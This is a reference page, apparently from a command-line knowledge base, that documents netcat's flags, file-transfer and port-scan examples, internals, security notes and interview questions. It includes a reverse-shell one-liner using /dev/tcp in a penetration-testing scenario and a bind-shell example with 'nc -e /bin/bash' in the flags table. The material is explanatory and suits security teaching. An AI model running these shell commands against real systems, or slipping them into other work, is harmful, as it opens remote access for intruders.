---
slug: nc
name: nc
aliases:
  - netcat
category: networking
tags:
  - linux
  - networking
  - sockets
  - port-scanning
  - proxy
  - security
difficulty: intermediate
supportedOS:
  - linux
  - macos
  - windows
  - unix
supportedShells:
  - bash
  - zsh
  - powershell
  - sh
intentPhrases:
  - check if port is open netcat
  - read and write over network sockets
  - transfer file via nc
  - setup simple tcp listener
  - test udp connection nc
relatedCommands:
  - nmap
  - mtr
  - ip
  - nslookup
  - ping
  - ss
  - syscall-sockets
alternatives: []
status: draft
---

## What is it?

`nc` (netcat), often referred to as the "Swiss Army knife" of networking, is a versatile command-line utility used to read from and write to network connections using TCP or UDP protocols. It bridges standard input and output (STDIN/STDOUT) across network sockets, acting as a backend tool to instantly provision simple servers, clients, proxies, or port scanners.

## Why does it exist?

While developers can write C or Python scripts to open sockets and transmit data, systems administrators and security professionals require an immediate, native tool to debug network flows, test firewall rules, and push arbitrary byte payloads across the wire without programming overhead. `nc` exists to abstract complex BSD socket programming into simple standard I/O redirection. If a tool like `cat` reads and writes files on a disk, `nc` reads and writes bytes across the internet.

## Syntax

```bash
nc [OPTIONS] [destination] [port]
nc -l [OPTIONS] [port]
```

## Flags

| Flag                | Description                                                                                                                       | Example                        |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------ |
| `-l`, `--listen`    | Instructs `nc` to act as a server, binding to a local port and listening for incoming connections.                                | `nc -l 8080`                   |
| `-p`, `--port`      | Specifies the source port `nc` should use (often required alongside `-l` depending on the variant).                               | `nc -l -p 8080`                |
| `-v`, `--verbose`   | Produces detailed output, printing successful connection statuses and IP resolutions.                                             | `nc -v example.com 80`         |
| `-n`, `--numeric`   | Bypasses DNS resolution, forcing `nc` to interpret addresses as raw IPs (vastly faster).                                          | `nc -vn 192.168.1.1 22`        |
| `-z`, `--zero`      | Specifies zero-I/O mode. `nc` scans for listening daemons without sending any data payloads.                                      | `nc -vz 10.0.0.1 20-30`        |
| `-u`, `--udp`       | Uses UDP (User Datagram Protocol) instead of the default TCP protocol.                                                            | `nc -vu 1.1.1.1 53`            |
| `-w`, `--wait`      | Sets an absolute timeout (in seconds) for connection attempts or periods of inactivity.                                           | `nc -w 5 example.com 80`       |
| `-k`, `--keep-open` | (When listening) Forces `nc` to accept multiple connections sequentially, rather than exiting after the first client disconnects. | `nc -lk 8080`                  |
| `-q`, `--quit`      | Sets a delay (in seconds) to wait after reading EOF on standard input before closing the connection.                              | `nc -q 1 target 80 < file.txt` |
| `-e`, `--exec`      | (Traditional/Ncat only) Executes an external program and pipes its standard I/O directly into the network socket.                 | `nc -l -p 4444 -e /bin/bash`   |

_(Note: Netcat has heavily fragmented implementations (GNU netcat, OpenBSD netcat, Nmap's ncat). Some flags, specifically `-e`, are often stripped from modern distributions for security reasons.)_

## Examples

```bash
nc -vz 192.168.1.100 22 80 443
```

> This utilizes zero-I/O mode (`-z`) and verbosity (`-v`) to perform a rapid port scan. `nc` attempts to establish the TCP 3-way handshake on ports 22, 80, and 443. If successful, it immediately drops the connection and reports "succeeded", effectively mapping open firewall holes.

```bash
nc -l 8080 > received_file.txt
```

> This instructs `nc` to bind to local port `8080` as a server (`-l`). Any network payload directed to this port is captured and redirected from standard output directly into a local file, creating a crude but effective one-shot file transfer server.

```bash
tar -cf - ./project | nc 10.0.0.5 8080
```

> This acts as the client side to the previous command. It packages a directory into a raw tar byte stream and pipes it into `nc`, which establishes a connection to the remote server and pushes the entire stream across the TCP socket.

```bash
echo -n "GET / HTTP/1.0\r\n\r\n" | nc example.com 80
```

> This constructs a raw, unencrypted HTTP payload manually using `echo` and pipes it into `nc`. `nc` connects to the web server, delivers the exact byte payload, and prints the raw HTTP response headers and HTML back to the terminal.

```bash
nc -vu 8.8.8.8 53
```

> This instructs `nc` to test a connection using the UDP protocol (`-u`). Because UDP is connectionless, `nc` will blindly send packets and await a response, which is vital for testing firewalls blocking DNS or Syslog traffic.

## Real-World Scenarios

**Testing Internal Firewall Rules Without Applications**

```bash
# On Destination Server:
nc -l 9000
# On Source Server:
nc -vz destination_ip 9000
```

> When developers request a firewall opening for a new application (but haven't installed the app yet), network engineers use `nc` to spin up a temporary, fake listener on the destination server, and use `nc` on the source server to definitively prove the firewall route is functioning.

**Ad-hoc Log Streaming across Segments**

```bash
tail -f /var/log/syslog | nc 10.0.5.50 514
```

> Systems administrators debugging isolated environments bypass complex Rsyslog configurations by piping a live log tail directly into `nc`, streaming the plaintext output across the network to a listening diagnostic machine in real-time.

**Reverse Shell for Security Penetration Testing**

```bash
# On Attacker Machine: nc -l -p 4444
# On Victim Machine:
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
```

> Security researchers exploit vulnerabilities on target servers to execute a bash redirection sequence that connects back to a listening `nc` instance on their attack machine, silently bridging the victim's terminal interface across the network.

## When should it NOT be used?

- **Transferring sensitive, confidential data:** **Reason:** `nc` is entirely unencrypted. It passes raw bytes over the network exactly as provided. Anyone with a packet sniffer (like Wireshark) on the path can read the data. **Use instead:** `scp`, `sftp`, or `rsync` over SSH.
- **Running persistent, robust network services:** **Reason:** Basic `nc` lacks multithreading, proper connection error handling, and robust logging. It crashes easily on malformed input. **Use instead:** `socat` or dedicated proxy daemons like HAProxy/Nginx.

## Alternatives

- **`socat` (SOcket CAT):** Advanced multipurpose relay. **Tradeoff:** `socat` is infinitely more powerful—capable of handling IPv6, SSL/TLS wrapping, serial ports, and multiplexing—but its syntax is significantly steeper and more complex than `nc`.
- **`ncat` (Nmap Project):** Modernized netcat. **Tradeoff:** Bundled with Nmap, `ncat` retains the simplicity of `nc` but reintroduces secure features like `--ssl` encryption, connection brokering, and access control lists.
- **`/dev/tcp/` (Bash specific):** Native shell networking. **Tradeoff:** Modern bash can natively open TCP sockets (e.g., `cat </dev/tcp/host/port`), eliminating the need to install the `nc` binary entirely on extremely stripped-down containers.

## How it works internally

`nc` is an elegant implementation of the fundamental BSD socket API.

In **client mode** (`nc host port`), `nc` utilizes the `socket()` system call to create an endpoint, performs DNS resolution on the hostname, and invokes `connect()` to establish the TCP 3-way handshake with the destination IP and port.

In **server mode** (`nc -l port`), `nc` invokes `socket()`, binds it to a local port using `bind()`, marks it passive using `listen()`, and blocks execution using `accept()` until a remote client initiates a handshake.

Once the socket connection is established in either mode, `nc` utilizes asynchronous I/O multiplexing (historically `select()` or `poll()`). It simultaneously monitors the established network socket and standard input (STDIN). If you type on your keyboard, it reads STDIN and invokes `send()` or `write()` to push the bytes into the network socket. If the remote server transmits data, it reads the network socket and invokes `write()` to dump the bytes to your terminal's standard output (STDOUT). This simple mirroring loop continues until either an EOF (End Of File) is received or the socket breaks.

## Performance Notes

- `nc` introduces almost zero computational overhead. Data transfer speeds using `nc` to pipe file contents across a network are strictly limited by the physical NIC bandwidth, TCP window sizes, and disk I/O, routinely outperforming encrypted protocols like SCP on trusted local networks.
- The traditional `nc` implementation closes entirely after a single connection disconnects. To handle multiple sequential transfers, use the `-k` (keep-open) flag.

## Security Notes

- **The `-e` (Execute) Backdoor:** The traditional GNU version of netcat includes the `-e` flag, which binds standard input/output directly to an executing binary (like `/bin/bash`). This provides an instantaneous, trivial mechanism to create remote backdoors. Due to this severe security risk, modern default installations (OpenBSD netcat) physically strip the `-e` functionality out of the compiled binary.
- **Unauthenticated Listeners:** Launching `nc -l 8080 > file.tar` creates an unauthenticated, unencrypted listener. Any machine on the network, malicious or not, can connect to that port and dump arbitrary garbage data into your file before the intended sender connects.

## Common Mistakes

- **Testing UDP reachability reliably:** Running `nc -vzu 8.8.8.8 53` and getting "Connection succeeded". **Why it's wrong:** UDP is connectionless. Sending a zero-byte probe (`-z`) via UDP merely proves the OS successfully dispatched the packet. It does not prove the packet arrived or the remote firewall allowed it, unless the application explicitly responds or sends an ICMP port unreachable error.
- **Reversing client and server file redirection:** Running `nc -l 8080 < file.txt` on the receiver. **Why it's wrong:** Redirection `<` feeds local data into `nc`. If you are receiving a file, you want standard output redirected to disk using `>`.
- **Hanging indefinitely after file transfers:** Transferring a file and waiting forever because the connection won't close. **Why it's wrong:** `nc` doesn't natively know when a piped byte stream is "finished." You must pass the `-q 1` (quit) flag so the sender terminates the connection one second after hitting the EOF marker.

## Best Practices

- When executing basic port scans or health checks in automation scripts, unconditionally append the `-n` (numeric) and `-w 2` (wait timeout) flags to prevent DNS resolution delays and ensure the script fails quickly if a firewall silently drops packets.
- Replace standard `nc` with the Nmap project's `ncat` variant when operating in enterprise environments to leverage built-in TLS encryption (`ncat --ssl`) for secure ad-hoc data transfers.

## Interview Questions

- _Query:_ In modern network security, why do most default Linux distributions use the OpenBSD variant of netcat instead of the traditional GNU netcat?
  - _A:_ The traditional GNU netcat includes the highly controversial `-e` (execute) flag, which allows operators to map a network socket directly to an executable binary, such as `/bin/sh`. This provides a trivial, one-line method for attackers to establish a remote backdoor or reverse shell. The OpenBSD variant deliberately removes this feature to mitigate the security risk.
- _Query:_ You use `nc -v 10.0.0.5 443` to test a connection to an internal web server, and it reports "Connection refused". Does this mean a firewall is blocking your traffic?
  - _A:_ No. "Connection refused" indicates that the packet successfully traversed the network and reached the destination server, but the server's OS actively rejected it with a TCP RST (Reset) packet because no application daemon was actively listening on port 443. If a firewall were blocking the traffic, it would typically silently drop the packet, resulting in a timeout.
- _Query:_ Explain how `nc` facilitates the transfer of an entire directory across a network without requiring an FTP or SSH server.
  - _A:_ `nc` handles raw byte streams. By combining it with `tar`, you can package a directory into a serialized data stream. The sender uses `tar -cf - ./dir | nc <ip> <port>` to stream the archive across the socket. The receiver sets up a listener using `nc -l <port> | tar -xf -`, which accepts the raw bytes and pipes them directly into `tar` to reconstruct the directory on the local disk.

## Practice Problems

- _Problem:_ Scan a remote server at `192.168.1.50` to determine if standard web ports (80 and 443) are open, without performing DNS resolution, outputting the results verbosely.
  - _Hint:_ Combine the zero-I/O scan mode, verbosity, bypass DNS, and pass the specific ports.
  - _Solution:_ `nc -vzn 192.168.1.50 80 443` (This rapidly attempts TCP handshakes on the specified ports and prints success or failure).
- _Problem:_ Establish a temporary listener on your local machine on port `9090` that serves the contents of the file `payload.json` to the very first client that connects.
  - _Hint:_ Instruct netcat to listen on the port, and use standard input redirection to feed the file contents into the socket.
  - _Solution:_ `nc -l 9090 < payload.json` (The netcat server accepts the incoming connection, dumps the file payload across the network, and then terminates).

## References

- [Netcat (nc) Man Page (OpenBSD version)](https://man.openbsd.org/nc.1)
- [Nmap Ncat Documentation](https://nmap.org/ncat/)
